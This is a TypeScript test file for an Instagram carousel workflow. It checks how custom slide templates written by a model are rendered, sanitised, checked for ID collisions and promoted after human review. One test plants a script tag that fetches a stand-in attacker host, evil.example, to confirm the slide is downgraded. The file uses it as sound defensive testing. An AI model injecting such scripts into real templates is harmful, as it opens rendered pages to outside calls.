import { describe, expect, it, afterEach, beforeEach } from "vitest";
import fsp from "node:fs/promises";
import pathMod from "node:path";
import { MemoryDurableStepStore, WorkflowEngine } from "@agent-engine/workflow";
import { MemoryTemplateStore } from "@agent-engine/tool-karos-templates";
import {
  createInstagramAgentWorkflow,
  customArchetypeTemplateId,
  validateCustomArchetypes,
} from "../src/workflow/create-instagram-agent-workflow.js";
import type { InstagramCopyOutput } from "../src/workflow/types.js";
import {
  fakeRenderCarousel,
  fakeRouterSequence,
  finalTurn,
  goodCopyOutput,
  goodImageCandidatePool,
  goodImageVettingOutput,
  goodResearchOutput,
  goodVisualQaOutput,
  makePromptStore,
  setupTestEnvironment,
  type TestEnvironment,
} from "./test-helpers.js";

const base = { clientSlug: "acme", productId: "instagram-agent", runKind: "recurring" as const };

/** `goodCopyOutput()`'s slide 2 turned into a valid, clean custom archetype. */
function withCustomArchetype(overrides: { archetypeId?: string; bodyHtml?: string } = {}): InstagramCopyOutput {
  const good = goodCopyOutput();
  return {
    ...good,
    slides: good.slides.map((s, i) =>
      i === 1
        ? {
            ...s,
            layout: "custom" as const,
            customArchetype: {
              archetypeId: overrides.archetypeId ?? "custom_bold_diagonal",
              name: "Bold diagonal stat",
              rationale: "none of the six standard archetypes give this figure the full-bleed diagonal treatment the client asked for",
              bodyHtml: overrides.bodyHtml ?? `<div class="wrap"><h1>{{kicker}}</h1><p>{{note}}</p></div>`,
              css: ".wrap h1 { font-family: var(--f-display); color: var(--fg); } .wrap p { color: var(--accent); }",
              slots: ["note"],
              fields: { note: "a supporting line the model wrote for this slide" },
            },
          }
        : s,
    ),
  };
}

describe("custom archetypes: authoring, safety, and promotion", () => {
  let env: TestEnvironment;
  beforeEach(async () => {
    // The promotion test below runs two full workflows against the same
    // client — the topic-floor guard (Fix 1) holds a reservation that would
    // leave the lane's unused-topic buffer below 5, so the default 6-topic
    // seed (which comfortably covers every OTHER test's single run) isn't
    // enough here.
    env = await setupTestEnvironment({
      seedTopics: Array.from({ length: 10 }, (_, i) => `topic ${i + 1} for custom archetype tests`),
    });
  });
  afterEach(async () => {
    await env.cleanup();
  });

  it("renders a run-authored custom archetype end to end", async () => {
    const store = new MemoryTemplateStore();
    const copy = withCustomArchetype();
    const router = fakeRouterSequence([
      finalTurn(goodResearchOutput()),
      finalTurn(copy),
      finalTurn(goodImageVettingOutput()),
      finalTurn(goodVisualQaOutput()),
    ]);

    const durableStore = new MemoryDurableStepStore();
    const result = await new WorkflowEngine(durableStore).run(
      createInstagramAgentWorkflow({
        tools: { ...env.tools, "publish.renderCarousel": fakeRenderCarousel(env.tools["publish.renderCarousel"]!) },
        promptStore: makePromptStore(),
        router,
        repoRoot: env.repoRoot,
        imageCandidatePool: goodImageCandidatePool(),
        autoApprove: true,
        templateStore: store,
      }),
      { runId: "custom_happy", ...base },
    );

    expect(result.status).toBe("completed");
    const steps = await durableStore.listSteps("custom_happy");
    const slidesData = steps.find((s) => s.stepId === "07c-emit-slides-data-attempt-1")?.output as
      | { slides: Array<{ n: number; template: string; fields: Record<string, string> }> }
      | undefined;
    const slide2 = slidesData?.slides.find((s) => s.n === 2);
    expect(slide2?.template).toBe("custom-bold-diagonal.html");
    expect(slide2?.fields["note"]).toBe("a supporting line the model wrote for this slide");

    // The materialized file is real, on disk, and is what the renderer's
    // OWN real path/existence check (`validateRenderInputs`, exercised by
    // `fakeRenderCarousel`) actually resolved against — not a fake.
    const written = await fsp.readFile(pathMod.join(env.repoRoot, ".template-cache", "custom_happy", "custom-bold-diagonal.html"), "utf8");
    expect(written).toContain("{{note}}");
    expect(written).toContain("window.__CAROUSEL_READY__ = true;");
  }, 30000);

  it("downgrades a slide whose custom archetype tries to smuggle a <script>, rather than failing the run", async () => {
    const store = new MemoryTemplateStore();
    const copy = withCustomArchetype({ bodyHtml: `<div><script>fetch('https://evil.example')</script>{{note}}</div>` });
    const router = fakeRouterSequence([
      finalTurn(goodResearchOutput()),
      finalTurn(copy),
      finalTurn(goodImageVettingOutput()),
      finalTurn(goodVisualQaOutput()),
    ]);

    const durableStore = new MemoryDurableStepStore();
    const result = await new WorkflowEngine(durableStore).run(
      createInstagramAgentWorkflow({
        tools: { ...env.tools, "publish.renderCarousel": fakeRenderCarousel(env.tools["publish.renderCarousel"]!) },
        promptStore: makePromptStore(),
        router,
        repoRoot: env.repoRoot,
        imageCandidatePool: goodImageCandidatePool(),
        autoApprove: true,
        templateStore: store,
      }),
      { runId: "custom_unsafe", ...base },
    );

    expect(result.status).toBe("completed");
    const steps = await durableStore.listSteps("custom_unsafe");
    const slidesData = steps.find((s) => s.stepId === "07c-emit-slides-data-attempt-1")?.output as
      | { slides: Array<{ n: number; template: string }> }
      | undefined;
    // Downgraded to the client's own base template, never held and never
    // rendered with the smuggled script.
    expect(slidesData?.slides.find((s) => s.n === 2)?.template).toBe("slide.html");
  }, 30000);

  it("belt-and-suspenders: refuses a custom archetypeId that collides with a real archetype id", () => {
    const good = goodCopyOutput();
    // Bypasses the schema's own `custom_` regex deliberately — this proves
    // the RUNTIME collision check, which exists precisely because a schema
    // regex is one edit away from being loosened later.
    const copy = {
      ...good,
      slides: good.slides.map((s, i) =>
        i === 1
          ? {
              ...s,
              layout: "custom" as const,
              customArchetype: {
                archetypeId: "stat_callout",
                name: "collision attempt",
                rationale: "x",
                bodyHtml: "<div>{{note}}</div>",
                css: "",
                slots: ["note"],
                fields: { note: "x" },
              },
            }
          : s,
      ),
    } as unknown as InstagramCopyOutput;

    expect(validateCustomArchetypes(copy)).toHaveLength(0);
  });

  it("promotes a custom archetype into the registry when the reviewer sets promote: true, and only reviews it (never re-promotes) on a later round", async () => {
    const store = new MemoryTemplateStore();
    const copy = withCustomArchetype();
    const revised = { ...copy, caption: `${copy.caption} (revised)` };
    const draftTurns = (c: InstagramCopyOutput) => [finalTurn(c), finalTurn(goodImageVettingOutput()), finalTurn(goodVisualQaOutput())];
    const router = fakeRouterSequence([finalTurn(goodResearchOutput()), ...draftTurns(copy), ...draftTurns(revised)]);

    const workflowFn = createInstagramAgentWorkflow({
      tools: { ...env.tools, "publish.renderCarousel": fakeRenderCarousel(env.tools["publish.renderCarousel"]!) },
      promptStore: makePromptStore(),
      router,
      repoRoot: env.repoRoot,
      imageCandidatePool: goodImageCandidatePool(),
      templateStore: store,
    });

    const durableStore = new MemoryDurableStepStore();
    const engine = new WorkflowEngine(durableStore);
    const runId = "custom_promote";
    const templateId = customArchetypeTemplateId("acme", "custom_bold_diagonal");

    const r0 = await engine.run(workflowFn, { runId, ...base });
    expect(r0.status).toBe("awaiting_gate");

    await engine.resolveGate(runId, "09a-batch-review-r0", {
      decision: "approve",
      actor: "jane@karoslabs.com",
      at: new Date().toISOString(),
      templateFeedback: [{ slide: 2, templateId, verdict: "approved", note: "great use of the diagonal treatment", promote: true }],
    });
    const r1 = await engine.run(workflowFn, { runId, ...base });
    expect(r1.status).toBe("completed");

    const promoted = await store.get(templateId);
    expect(promoted).toBeDefined();
    expect(promoted?.source).toBe("ai_generated");
    expect(promoted?.qualityScore).toBe(40);
    expect(promoted?.htmlTemplate).toContain("{{note}}");
    expect(promoted?.cssStyles).toContain("var(--accent)");

    // A SECOND run whose reviewer promotes the SAME archetypeId again must
    // take the review path, not re-promote — otherwise a same-id double
    // promotion would silently reset the score back to 40.
    const router2 = fakeRouterSequence([finalTurn(goodResearchOutput()), ...draftTurns(copy)]);
    const workflowFn2 = createInstagramAgentWorkflow({
      tools: { ...env.tools, "publish.renderCarousel": fakeRenderCarousel(env.tools["publish.renderCarousel"]!) },
      promptStore: makePromptStore(),
      router: router2,
      repoRoot: env.repoRoot,
      imageCandidatePool: goodImageCandidatePool(),
      templateStore: store,
    });
    const runId2 = "custom_promote_again";
    const r2 = await engine.run(workflowFn2, { runId: runId2, ...base });
    expect(r2.status).toBe("awaiting_gate");
    await engine.resolveGate(runId2, "09a-batch-review-r0", {
      decision: "approve",
      actor: "jane@karoslabs.com",
      at: new Date().toISOString(),
      templateFeedback: [{ slide: 2, templateId, verdict: "approved", note: "still great", promote: true }],
    });
    const r3 = await engine.run(workflowFn2, { runId: runId2, ...base });
    expect(r3.status).toBe("completed");

    // Reviewed, not re-promoted: qualityScore moved by the ordinary approval
    // delta (+5) from its already-promoted 40, not reset back to 40.
    expect((await store.get(templateId))!.qualityScore).toBe(45);
  }, 60000);
});
